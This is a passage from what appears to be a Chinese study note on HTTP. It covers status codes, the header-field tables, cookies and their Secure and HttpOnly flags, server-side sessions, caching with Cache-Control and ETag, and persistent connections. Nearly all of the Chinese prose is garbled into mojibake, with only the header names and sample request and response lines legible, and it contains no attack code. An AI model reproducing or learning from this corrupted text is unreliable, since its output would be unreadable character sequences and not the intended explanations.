ï¼šè¯¥çŠ¶æ€ç è¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰è®¤è¯ä¿¡æ¯ï¼ˆBASIC è®¤è¯ã€DIGEST è®¤è¯ï¼‰ã€‚å¦‚æœä¹‹å‰å·²è¿›è¡Œè¿‡ä¸€æ¬¡è¯·æ±‚ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·è®¤è¯å¤±è´¥ã€‚ 403 Forbidden ï¼šè¯·æ±‚è¢«æ‹’ç»ï¼ŒæœåŠ¡å™¨ç«¯æ²¡æœ‰å¿…è¦ç»™å‡ºæ‹’ç»çš„è¯¦ç»†ç†ç”±ã€‚ 404 Not Found 5XX æœåŠ¡å™¨é”™è¯¯ 500 Internal Server Error ï¼šæœåŠ¡å™¨æ­£åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯ã€‚ 503 Service Unavilable ï¼šæœåŠ¡å™¨æš‚æ—¶å¤„äºè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼Œç°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚ å››ã€HTTP é¦–éƒ¨æœ‰ 4 ç§ç±»å‹çš„é¦–éƒ¨å­—æ®µï¼šé€šç”¨é¦–éƒ¨å­—æ®µã€è¯·æ±‚é¦–éƒ¨å­—æ®µã€å“åº”é¦–éƒ¨å­—æ®µå’Œå®ä½“é¦–éƒ¨å­—æ®µã€‚ å„ç§é¦–éƒ¨å­—æ®µåŠå…¶å«ä¹‰å¦‚ä¸‹ï¼ˆä¸éœ€è¦å…¨è®°ï¼Œä»…ä¾›æŸ¥é˜…ï¼‰ï¼š é€šç”¨é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜ Cache-Control æ§åˆ¶ç¼“å­˜çš„è¡Œä¸º Connection æ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µã€ç®¡ç†æŒä¹…è¿æ¥ Date åˆ›å»ºæŠ¥æ–‡çš„æ—¥æœŸæ—¶é—´ Pragma æŠ¥æ–‡æŒ‡ä»¤ Trailer æŠ¥æ–‡æœ«ç«¯çš„é¦–éƒ¨ä¸€è§ˆ Transfer-Encoding æŒ‡å®šæŠ¥æ–‡ä¸»ä½“çš„ä¼ è¾“ç¼–ç æ–¹å¼ Upgrade å‡çº§ä¸ºå…¶ä»–åè®® Via ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯ Warning é”™è¯¯é€šçŸ¥ è¯·æ±‚é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜ Accept ç”¨æˆ·ä»£ç†å¯å¤„ç†çš„åª’ä½“ç±»å‹ Accept-Charset ä¼˜å…ˆçš„å­—ç¬¦é›† Accept-Encoding ä¼˜å…ˆçš„å†…å®¹ç¼–ç  Accept-Language ä¼˜å…ˆçš„è¯­è¨€ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰ Authorization Web è®¤è¯ä¿¡æ¯ Expect æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º From ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€ Host è¯·æ±‚èµ„æºæ‰€åœ¨æœåŠ¡å™¨ If-Match æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆETagï¼‰ If-Modified-Since æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ If-None-Match æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆä¸ If-Match ç›¸åï¼‰ If-Range èµ„æºæœªæ›´æ–°æ—¶å‘é€å®ä½“ Byte çš„èŒƒå›´è¯·æ±‚ If-Unmodified-Since æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ï¼ˆä¸ If-Modified-Since ç›¸åï¼‰ Max-Forwards æœ€å¤§ä¼ è¾“é€è·³æ•° Proxy-Authorization ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ Range å®ä½“çš„å­—èŠ‚èŒƒå›´è¯·æ±‚ Referer å¯¹è¯·æ±‚ä¸­ URI çš„åŸå§‹è·å–æ–¹ TE ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§ User-Agent HTTP å®¢æˆ·ç«¯ç¨‹åºçš„ä¿¡æ¯ å“åº”é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜ Accept-Ranges æ˜¯å¦æ¥å—å­—èŠ‚èŒƒå›´è¯·æ±‚ Age æ¨ç®—èµ„æºåˆ›å»ºç»è¿‡æ—¶é—´ ETag èµ„æºçš„åŒ¹é…ä¿¡æ¯ Location ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®š URI Proxy-Authenticate ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ Retry-After å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚ Server HTTP æœåŠ¡å™¨çš„å®‰è£…ä¿¡æ¯ Vary ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†ä¿¡æ¯ WWW-Authenticate æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ å®ä½“é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜ Allow èµ„æºå¯æ”¯æŒçš„ HTTP æ–¹æ³• Content-Encoding å®ä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼ Content-Language å®ä½“ä¸»ä½“çš„è‡ªç„¶è¯­è¨€ Content-Length å®ä½“ä¸»ä½“çš„å¤§å° Content-Location æ›¿ä»£å¯¹åº”èµ„æºçš„ URI Content-MD5 å®ä½“ä¸»ä½“çš„æŠ¥æ–‡æ‘˜è¦ Content-Range å®ä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´ Content-Type å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹ Expires å®ä½“ä¸»ä½“è¿‡æœŸçš„æ—¥æœŸæ—¶é—´ Last-Modified èµ„æºçš„æœ€åä¿®æ”¹æ—¥æœŸæ—¶é—´ äº”ã€å…·ä½“åº”ç”¨CookieHTTP åè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†è®© HTTP åè®®å°½å¯èƒ½ç®€å•ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿå¤„ç†å¤§é‡äº‹åŠ¡ã€‚HTTP/1.1 å¼•å…¥ Cookie æ¥ä¿å­˜çŠ¶æ€ä¿¡æ¯ã€‚ Cookie æ˜¯æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·æµè§ˆå™¨å¹¶ä¿å­˜åœ¨æœ¬åœ°çš„ä¸€å°å—æ•°æ®ï¼Œå®ƒä¼šåœ¨æµè§ˆå™¨ä¸‹æ¬¡å‘åŒä¸€æœåŠ¡å™¨å†å‘èµ·è¯·æ±‚æ—¶è¢«æºå¸¦å¹¶å‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚å®ƒç”¨äºå‘ŠçŸ¥æœåŠ¡ç«¯ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€æµè§ˆå™¨ï¼Œå¹¶ä¿æŒç”¨æˆ·çš„ç™»å½•çŠ¶æ€ã€‚ 1. ç”¨é€” ä¼šè¯çŠ¶æ€ç®¡ç†ï¼ˆå¦‚ç”¨æˆ·ç™»å½•çŠ¶æ€ã€è´­ç‰©è½¦ã€æ¸¸æˆåˆ†æ•°æˆ–å…¶å®ƒéœ€è¦è®°å½•çš„ä¿¡æ¯ï¼‰ ä¸ªæ€§åŒ–è®¾ç½®ï¼ˆå¦‚ç”¨æˆ·è‡ªå®šä¹‰è®¾ç½®ã€ä¸»é¢˜ç­‰ï¼‰ æµè§ˆå™¨è¡Œä¸ºè·Ÿè¸ªï¼ˆå¦‚è·Ÿè¸ªåˆ†æç”¨æˆ·è¡Œä¸ºç­‰ï¼‰ Cookie æ›¾ä¸€åº¦ç”¨äºå®¢æˆ·ç«¯æ•°æ®çš„å­˜å‚¨ï¼Œå› ä¸ºå½“æ—¶å¹¶æ²¡æœ‰å…¶å®ƒåˆé€‚çš„å­˜å‚¨åŠæ³•è€Œä½œä¸ºå”¯ä¸€çš„å­˜å‚¨æ‰‹æ®µï¼Œä½†ç°åœ¨éšç€ç°ä»£æµè§ˆå™¨å¼€å§‹æ”¯æŒå„ç§å„æ ·çš„å­˜å‚¨æ–¹å¼ï¼ŒCookie æ¸æ¸è¢«æ·˜æ±°ã€‚ç”±äºæœåŠ¡å™¨æŒ‡å®š Cookie åï¼Œæµè§ˆå™¨çš„æ¯æ¬¡è¯·æ±‚éƒ½ä¼šæºå¸¦ Cookie æ•°æ®ï¼Œä¼šå¸¦æ¥é¢å¤–çš„æ€§èƒ½å¼€é”€ï¼ˆå°¤å…¶æ˜¯åœ¨ç§»åŠ¨ç¯å¢ƒä¸‹ï¼‰ã€‚æ–°çš„æµè§ˆå™¨ API å·²ç»å…è®¸å¼€å‘è€…ç›´æ¥å°†æ•°æ®å­˜å‚¨åˆ°æœ¬åœ°ï¼Œå¦‚ä½¿ç”¨ Web storage API ï¼ˆæœ¬åœ°å­˜å‚¨å’Œä¼šè¯å­˜å‚¨ï¼‰æˆ– IndexedDBã€‚ 2. åˆ›å»ºè¿‡ç¨‹æœåŠ¡å™¨å‘é€çš„å“åº”æŠ¥æ–‡åŒ…å« Set-Cookie é¦–éƒ¨å­—æ®µï¼Œå®¢æˆ·ç«¯å¾—åˆ°å“åº”æŠ¥æ–‡åæŠŠ Cookie å†…å®¹ä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚ 123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content] å®¢æˆ·ç«¯ä¹‹åå¯¹åŒä¸€ä¸ªæœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œä¼šä»æµè§ˆå™¨ä¸­è¯»å‡º Cookie ä¿¡æ¯é€šè¿‡ Cookie è¯·æ±‚é¦–éƒ¨å­—æ®µå‘é€ç»™æœåŠ¡å™¨ã€‚ 123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry 3. åˆ†ç±» ä¼šè¯æœŸ Cookieï¼šæµè§ˆå™¨å…³é—­ä¹‹åå®ƒä¼šè¢«è‡ªåŠ¨åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»…åœ¨ä¼šè¯æœŸå†…æœ‰æ•ˆã€‚ æŒä¹…æ€§ Cookieï¼šæŒ‡å®šä¸€ä¸ªç‰¹å®šçš„è¿‡æœŸæ—¶é—´ï¼ˆExpiresï¼‰æˆ–æœ‰æ•ˆæœŸï¼ˆmax-ageï¼‰ä¹‹åå°±æˆä¸ºäº†æŒä¹…æ€§çš„ Cookieã€‚ 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 4. JavaScript è·å– Cookieé€šè¿‡ Document.cookie å±æ€§å¯åˆ›å»ºæ–°çš„ Cookieï¼Œä¹Ÿå¯é€šè¿‡è¯¥å±æ€§è®¿é—®é HttpOnly æ ‡è®°çš„ Cookieã€‚ 123document.cookie = "yummy_cookie=choco";document.cookie = "tasty_cookie=strawberry";console.log(document.cookie); 5. Secure å’Œ HttpOnlyæ ‡è®°ä¸º Secure çš„ Cookie åªåº”é€šè¿‡è¢« HTTPS åè®®åŠ å¯†è¿‡çš„è¯·æ±‚å‘é€ç»™æœåŠ¡ç«¯ã€‚ä½†å³ä¾¿è®¾ç½®äº† Secure æ ‡è®°ï¼Œæ•æ„Ÿä¿¡æ¯ä¹Ÿä¸åº”è¯¥é€šè¿‡ Cookie ä¼ è¾“ï¼Œå› ä¸º Cookie æœ‰å…¶å›ºæœ‰çš„ä¸å®‰å…¨æ€§ï¼ŒSecure æ ‡è®°ä¹Ÿæ— æ³•æä¾›ç¡®å®çš„å®‰å…¨ä¿éšœã€‚ æ ‡è®°ä¸º HttpOnly çš„ Cookie ä¸èƒ½è¢« JavaScript è„šæœ¬è°ƒç”¨ã€‚å› ä¸ºè·¨åŸŸè„šæœ¬ (XSS) æ”»å‡»å¸¸å¸¸ä½¿ç”¨ JavaScript çš„ Document.cookie API çªƒå–ç”¨æˆ·çš„ Cookie ä¿¡æ¯ï¼Œå› æ­¤ä½¿ç”¨ HttpOnly æ ‡è®°å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å… XSS æ”»å‡»ã€‚ 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 6. ä½œç”¨åŸŸDomain æ ‡è¯†æŒ‡å®šäº†å“ªäº›ä¸»æœºå¯ä»¥æ¥å— Cookieã€‚å¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä¸ºå½“å‰æ–‡æ¡£çš„ä¸»æœºï¼ˆä¸åŒ…å«å­åŸŸåï¼‰ã€‚å¦‚æœæŒ‡å®šäº† Domainï¼Œåˆ™ä¸€èˆ¬åŒ…å«å­åŸŸåã€‚ä¾‹å¦‚ï¼Œå¦‚æœè®¾ç½® Domain=mozilla.orgï¼Œåˆ™ Cookie ä¹ŸåŒ…å«åœ¨å­åŸŸåä¸­ï¼ˆå¦‚ developer.mozilla.orgï¼‰ã€‚ Path æ ‡è¯†æŒ‡å®šäº†ä¸»æœºä¸‹çš„å“ªäº›è·¯å¾„å¯ä»¥æ¥å— Cookieï¼ˆè¯¥ URL è·¯å¾„å¿…é¡»å­˜åœ¨äºè¯·æ±‚ URL ä¸­ï¼‰ã€‚ä»¥å­—ç¬¦ %x2F (â€œ/â€œ) ä½œä¸ºè·¯å¾„åˆ†éš”ç¬¦ï¼Œå­è·¯å¾„ä¹Ÿä¼šè¢«åŒ¹é…ã€‚ä¾‹å¦‚ï¼Œè®¾ç½® Path=/docsï¼Œåˆ™ä»¥ä¸‹åœ°å€éƒ½ä¼šåŒ¹é…ï¼š /docs /docs/Web/ /docs/Web/HTTP 7. Sessioné™¤äº†å¯ä»¥å°†ç”¨æˆ·ä¿¡æ¯é€šè¿‡ Cookie å­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ Session å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯çš„ä¿¡æ¯æ›´åŠ å®‰å…¨ã€‚ Session å¯ä»¥å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€æ•°æ®åº“æˆ–è€…å†…å­˜ä¸­ï¼Œç°åœ¨æœ€å¸¸è§çš„æ˜¯å°† Session å­˜å‚¨åœ¨å†…å­˜å‹æ•°æ®åº“ä¸­ï¼Œæ¯”å¦‚ Redisã€‚ ä½¿ç”¨ Session ç»´æŠ¤ç”¨æˆ·ç™»å½•çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š ç”¨æˆ·è¿›è¡Œç™»å½•æ—¶ï¼Œç”¨æˆ·æäº¤åŒ…å«ç”¨æˆ·åå’Œå¯†ç çš„è¡¨å•ï¼Œæ”¾å…¥ HTTP è¯·æ±‚æŠ¥æ–‡ä¸­ï¼› æœåŠ¡å™¨éªŒè¯è¯¥ç”¨æˆ·åå’Œå¯†ç ï¼› å¦‚æœæ­£ç¡®åˆ™æŠŠç”¨æˆ·ä¿¡æ¯å­˜å‚¨åˆ° Redis ä¸­ï¼Œå®ƒåœ¨ Redis ä¸­çš„ ID ç§°ä¸º Session IDï¼› æœåŠ¡å™¨è¿”å›çš„å“åº”æŠ¥æ–‡çš„ Set-Cookie é¦–éƒ¨å­—æ®µåŒ…å«äº†è¿™ä¸ª Session IDï¼Œå®¢æˆ·ç«¯æ”¶åˆ°å“åº”æŠ¥æ–‡ä¹‹åå°†è¯¥ Cookie å€¼å­˜å…¥æµè§ˆå™¨ä¸­ï¼› å®¢æˆ·ç«¯ä¹‹åå¯¹åŒä¸€ä¸ªæœåŠ¡å™¨è¿›è¡Œè¯·æ±‚æ—¶ä¼šåŒ…å«è¯¥ Cookie å€¼ï¼ŒæœåŠ¡å™¨æ”¶åˆ°ä¹‹åæå–å‡º Session IDï¼Œä» Redis ä¸­å–å‡ºç”¨æˆ·ä¿¡æ¯ï¼Œç»§ç»­ä¹‹åçš„ä¸šåŠ¡æ“ä½œã€‚ åº”è¯¥æ³¨æ„ Session ID çš„å®‰å…¨æ€§é—®é¢˜ï¼Œä¸èƒ½è®©å®ƒè¢«æ¶æ„æ”»å‡»è€…è½»æ˜“è·å–ï¼Œé‚£ä¹ˆå°±ä¸èƒ½äº§ç”Ÿä¸€ä¸ªå®¹æ˜“è¢«çŒœåˆ°çš„ Session ID å€¼ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦ç»å¸¸é‡æ–°ç”Ÿæˆ Session IDã€‚åœ¨å¯¹å®‰å…¨æ€§è¦æ±‚æé«˜çš„åœºæ™¯ä¸‹ï¼Œä¾‹å¦‚è½¬è´¦ç­‰æ“ä½œï¼Œé™¤äº†ä½¿ç”¨ Session ç®¡ç†ç”¨æˆ·çŠ¶æ€ä¹‹å¤–ï¼Œè¿˜éœ€è¦å¯¹ç”¨æˆ·è¿›è¡Œé‡æ–°éªŒè¯ï¼Œæ¯”å¦‚é‡æ–°è¾“å…¥å¯†ç ï¼Œæˆ–è€…ä½¿ç”¨çŸ­ä¿¡éªŒè¯ç ç­‰æ–¹å¼ã€‚ 8. æµè§ˆå™¨ç¦ç”¨ Cookieæ­¤æ—¶æ— æ³•ä½¿ç”¨ Cookie æ¥ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œåªèƒ½ä½¿ç”¨ Sessionã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¸èƒ½å†å°† Session ID å­˜æ”¾åˆ° Cookie ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨ URL é‡å†™æŠ€æœ¯ï¼Œå°† Session ID ä½œä¸º URL çš„å‚æ•°è¿›è¡Œä¼ é€’ã€‚ 9. Cookie ä¸ Session é€‰æ‹© Cookie åªèƒ½å­˜å‚¨ ASCII ç å­—ç¬¦ä¸²ï¼Œè€Œ Session åˆ™å¯ä»¥å­˜å–ä»»ä½•ç±»å‹çš„æ•°æ®ï¼Œå› æ­¤åœ¨è€ƒè™‘æ•°æ®å¤æ‚æ€§æ—¶é¦–é€‰ Sessionï¼› Cookie å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­ï¼Œå®¹æ˜“è¢«æ¶æ„æŸ¥çœ‹ã€‚å¦‚æœéè¦å°†ä¸€äº›éšç§æ•°æ®å­˜åœ¨ Cookie ä¸­ï¼Œå¯ä»¥å°† Cookie å€¼è¿›è¡ŒåŠ å¯†ï¼Œç„¶ååœ¨æœåŠ¡å™¨è¿›è¡Œè§£å¯†ï¼› å¯¹äºå¤§å‹ç½‘ç«™ï¼Œå¦‚æœç”¨æˆ·æ‰€æœ‰çš„ä¿¡æ¯éƒ½å­˜å‚¨åœ¨ Session ä¸­ï¼Œé‚£ä¹ˆå¼€é”€æ˜¯éå¸¸å¤§çš„ï¼Œå› æ­¤ä¸å»ºè®®å°†æ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯éƒ½å­˜å‚¨åˆ° Session ä¸­ã€‚ ç¼“å­˜1. ä¼˜ç‚¹ ç¼“è§£æœåŠ¡å™¨å‹åŠ›ï¼› é™ä½å®¢æˆ·ç«¯è·å–èµ„æºçš„å»¶è¿Ÿï¼ˆç¼“å­˜èµ„æºæ¯”æœåŠ¡å™¨ä¸Šçš„èµ„æºç¦»å®¢æˆ·ç«¯æ›´è¿‘ï¼‰ã€‚ 2. å®ç°æ–¹æ³• è®©ä»£ç†æœåŠ¡å™¨è¿›è¡Œç¼“å­˜ï¼› è®©å®¢æˆ·ç«¯æµè§ˆå™¨è¿›è¡Œç¼“å­˜ã€‚ 3. Cache-ControlHTTP/1.1 é€šè¿‡ Cache-Control é¦–éƒ¨å­—æ®µæ¥æ§åˆ¶ç¼“å­˜ã€‚ ï¼ˆä¸€ï¼‰ç¦æ­¢è¿›è¡Œç¼“å­˜ no-store æŒ‡ä»¤è§„å®šä¸èƒ½å¯¹è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•ä¸€éƒ¨åˆ†è¿›è¡Œç¼“å­˜ã€‚ 1Cache-Control: no-store ï¼ˆäºŒï¼‰å¼ºåˆ¶ç¡®è®¤ç¼“å­˜ no-cache æŒ‡ä»¤è§„å®šç¼“å­˜æœåŠ¡å™¨éœ€è¦å…ˆå‘æºæœåŠ¡å™¨éªŒè¯ç¼“å­˜èµ„æºçš„æœ‰æ•ˆæ€§ï¼Œåªæœ‰å½“ç¼“å­˜èµ„æºæœ‰æ•ˆæ‰å°†èƒ½ä½¿ç”¨è¯¥ç¼“å­˜å¯¹å®¢æˆ·ç«¯çš„è¯·æ±‚è¿›è¡Œå“åº”ã€‚ 1Cache-Control: no-cache ï¼ˆä¸‰ï¼‰ç§æœ‰ç¼“å­˜å’Œå…¬å…±ç¼“å­˜ private æŒ‡ä»¤è§„å®šäº†å°†èµ„æºä½œä¸ºç§æœ‰ç¼“å­˜ï¼Œåªèƒ½è¢«å•ç‹¬ç”¨æˆ·æ‰€ä½¿ç”¨ï¼Œä¸€èˆ¬å­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­ã€‚ 1Cache-Control: private public æŒ‡ä»¤è§„å®šäº†å°†èµ„æºä½œä¸ºå…¬å…±ç¼“å­˜ï¼Œå¯ä»¥è¢«å¤šä¸ªç”¨æˆ·æ‰€ä½¿ç”¨ï¼Œä¸€èˆ¬å­˜å‚¨åœ¨ä»£ç†æœåŠ¡å™¨ä¸­ã€‚ 1Cache-Control: public ï¼ˆå››ï¼‰ç¼“å­˜è¿‡æœŸæœºåˆ¶ max-age æŒ‡ä»¤å‡ºç°åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­ï¼Œå¹¶ä¸”ç¼“å­˜èµ„æºçš„ç¼“å­˜æ—¶é—´å°äºè¯¥æŒ‡ä»¤æŒ‡å®šçš„æ—¶é—´ï¼Œé‚£ä¹ˆå°±èƒ½æ¥å—è¯¥ç¼“å­˜ã€‚ max-age æŒ‡ä»¤å‡ºç°åœ¨å“åº”æŠ¥æ–‡ä¸­ï¼Œè¡¨ç¤ºç¼“å­˜èµ„æºåœ¨ç¼“å­˜æœåŠ¡å™¨ä¸­ä¿å­˜çš„æ—¶é—´ã€‚ 1Cache-Control: max-age=31536000 Expires é¦–éƒ¨å­—æ®µä¹Ÿå¯ä»¥ç”¨äºå‘ŠçŸ¥ç¼“å­˜æœåŠ¡å™¨è¯¥èµ„æºä»€ä¹ˆæ—¶å€™ä¼šè¿‡æœŸã€‚åœ¨ HTTP/1.1 ä¸­ï¼Œä¼šä¼˜å…ˆå¤„ç† Cache-Control : max-age æŒ‡ä»¤ï¼›è€Œåœ¨ HTTP/1.0 ä¸­ï¼ŒCache-Control : max-age æŒ‡ä»¤ä¼šè¢«å¿½ç•¥æ‰ã€‚ 1Expires: Wed, 04 Jul 2012 08:26:05 GMT 4. ç¼“å­˜éªŒè¯éœ€è¦å…ˆäº†è§£ ETag é¦–éƒ¨å­—æ®µçš„å«ä¹‰ï¼Œå®ƒæ˜¯èµ„æºçš„å”¯ä¸€æ ‡è¯†ã€‚URL ä¸èƒ½å”¯ä¸€è¡¨ç¤ºèµ„æºï¼Œä¾‹å¦‚ http://www.google.com/ æœ‰ä¸­æ–‡å’Œè‹±æ–‡ä¸¤ä¸ªèµ„æºï¼Œåªæœ‰ ETag æ‰èƒ½å¯¹è¿™ä¸¤ä¸ªèµ„æºè¿›è¡Œå”¯ä¸€æ ‡è¯†ã€‚ 1ETag: "82e22293907ce725faf67773957acd12" å¯ä»¥å°†ç¼“å­˜èµ„æºçš„ ETag å€¼æ”¾å…¥ If-None-Match é¦–éƒ¨ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚åï¼Œåˆ¤æ–­ç¼“å­˜èµ„æºçš„ ETag å€¼å’Œèµ„æºçš„æœ€æ–° ETag å€¼æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™è¡¨ç¤ºç¼“å­˜èµ„æºæœ‰æ•ˆï¼Œè¿”å› 304 Not Modifiedã€‚ 1If-None-Match: "82e22293907ce725faf67773957acd12" Last-Modified é¦–éƒ¨å­—æ®µä¹Ÿå¯ä»¥ç”¨äºç¼“å­˜éªŒè¯ï¼Œå®ƒåŒ…å«åœ¨æºæœåŠ¡å™¨å‘é€çš„å“åº”æŠ¥æ–‡ä¸­ï¼ŒæŒ‡ç¤ºæºæœåŠ¡å™¨å¯¹èµ„æºçš„æœ€åä¿®æ”¹æ—¶é—´ã€‚ä½†æ˜¯å®ƒæ˜¯ä¸€ç§å¼±æ ¡éªŒå™¨ï¼Œå› ä¸ºåªèƒ½ç²¾ç¡®åˆ°ä¸€ç§’ï¼Œæ‰€ä»¥å®ƒé€šå¸¸ä½œä¸º ETag çš„å¤‡ç”¨æ–¹æ¡ˆã€‚å¦‚æœå“åº”é¦–éƒ¨å­—æ®µé‡Œå«æœ‰è¿™ä¸ªä¿¡æ¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥åœ¨åç»­çš„è¯·æ±‚ä¸­å¸¦ä¸Š If-Modified-Since æ¥éªŒè¯ç¼“å­˜ã€‚æœåŠ¡å™¨åªåœ¨æ‰€è¯·æ±‚çš„èµ„æºåœ¨ç»™å®šçš„æ—¥æœŸæ—¶é—´ä¹‹åå¯¹å†…å®¹è¿›è¡Œè¿‡ä¿®æ”¹çš„æƒ…å†µä¸‹æ‰ä¼šå°†èµ„æºè¿”å›ï¼ŒçŠ¶æ€ç ä¸º 200 OKã€‚å¦‚æœè¯·æ±‚çš„èµ„æºä»é‚£æ—¶èµ·æœªç»ä¿®æ”¹ï¼Œé‚£ä¹ˆè¿”å›ä¸€ä¸ªä¸å¸¦æœ‰æ¶ˆæ¯ä¸»ä½“çš„ 304 Not Modified å“åº”ï¼Œ 1Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT 1If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT è¿æ¥ç®¡ç† 1. çŸ­è¿æ¥ä¸é•¿è¿æ¥å½“æµè§ˆå™¨è®¿é—®ä¸€ä¸ªåŒ…å«å¤šå¼ å›¾ç‰‡çš„ HTML é¡µé¢æ—¶ï¼Œé™¤äº†è¯·æ±‚è®¿é—® HTML é¡µé¢èµ„æºï¼Œè¿˜ä¼šè¯·æ±‚å›¾ç‰‡èµ„æºï¼Œå¦‚æœæ¯è¿›è¡Œä¸€æ¬¡ HTTP é€šä¿¡å°±è¦æ–­å¼€ä¸€æ¬¡ TCP è¿æ¥ï¼Œè¿æ¥å»ºç«‹å’Œæ–­å¼€çš„å¼€é”€ä¼šå¾ˆå¤§ã€‚é•¿è¿æ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡ TCP è¿æ¥å°±èƒ½è¿›è¡Œå¤šæ¬¡ HTTP é€šä¿¡ã€‚ ä» HTTP/1.1 å¼€å§‹é»˜è®¤æ˜¯é•¿è¿æ¥çš„ï¼Œå¦‚æœè¦æ–­å¼€è¿æ¥ï¼Œéœ€è¦ç”±å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡å™¨ç«¯æå‡ºæ–­å¼€ï¼Œä½¿ç”¨ Connection : closeï¼›è€Œåœ¨ HTTP/1.1 ä¹‹å‰é»˜è®¤æ˜¯çŸ­è¿æ¥çš„ï¼Œå¦‚æœéœ€è¦é•¿è¿æ¥ï¼Œåˆ™ä½¿ç”¨ Connection : Keep-Aliveã€‚ 2. æµæ°´çº¿é»˜è®¤æƒ…å†µä¸‹ï¼ŒHTTP è¯·æ±‚æ˜¯æŒ‰é¡ºåºå‘å‡ºçš„ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚åªæœ‰åœ¨å½“å‰è¯·æ±‚æ”¶åˆ°åº”ç­”è¿‡åæ‰ä¼šè¢«å‘å‡ºã€‚ç”±äºä¼šå—åˆ°ç½‘ç»œå»¶è¿Ÿå’Œå¸¦å®½çš„é™åˆ¶ï¼Œåœ¨ä¸‹ä¸€ä¸ªè¯·æ±‚è¢«å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰ï¼Œå¯èƒ½éœ€è¦ç­‰å¾…å¾ˆé•¿æ—¶é—´ã€‚ æµæ°´çº¿æ˜¯åœ¨åŒä¸€æ¡é•¿è¿æ¥ä¸Šå‘å‡ºè¿ç»­çš„è¯·æ±‚ï¼Œè€Œä¸ç”¨ç­‰å¾…å“åº”è¿”å›ï¼Œè¿™æ ·å¯ä»¥é¿å…è¿æ¥å»¶è¿Ÿã€‚ å†…å®¹åå•†é€šè¿‡å†…å®¹åå•†è¿”å›æœ€åˆé€‚çš„å†…å®¹ï¼Œä¾‹å¦‚æ ¹æ®æµè§ˆå™¨çš„é»˜è®¤è¯­è¨€é€‰æ‹©è¿”å›ä¸­æ–‡ç•Œé¢è¿˜æ˜¯è‹±æ–‡ç•Œé¢ã€‚ 1. ç±»å‹ï¼ˆä¸€ï¼‰æœåŠ¡ç«¯é©±åŠ¨å‹å†…å®¹åå•† 